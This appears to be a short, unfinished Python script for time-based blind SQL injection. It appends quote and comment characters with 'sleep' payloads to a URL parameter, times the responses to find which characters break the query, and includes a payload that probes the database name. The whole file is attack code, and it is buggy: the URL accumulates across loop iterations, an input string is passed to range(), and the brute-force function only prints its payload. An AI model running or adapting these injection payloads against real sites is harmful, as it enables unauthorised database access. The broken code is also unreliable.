#! /usr/bin/env python3

import requests
from requests.models import parse_url
import itertools

def escape(url,param,list = ["\\",",","'","#","/",'"','.',"' OR 1 = 1"]) :      #code to find the break to break query.
    
    char = []
    print("Trying to break the query...")
    for i in list:
        url = url+param+"=1"+i+" and sleep(1.5); --+"
        r=requests.get(url)
        t = r.elapsed.total_seconds()
        if t > 1.5 :
            char.append(i)

    if not char : #checks if the char array is empty or not
        print("Unable to break query with default character set.")
        option = input("Do you want to try out your own character set? [y/n]")
        if option.lower() == 'y' :
            num = input("Enter number of characters you want to enter : ")
            print("Enter characters : ")
            for i in range(num) :
                list.append(input())
            
            escape(url,param,list) #recursive function with the updated list of characters

    return char

#Function to bruteforce information from the database
def bruteforce():
    functions = ['database()','version(),user()']
    payload = "?id=1' and if ((select database())=\"security\", sleep(5),\"null\"); --+"
    print(payload)

            

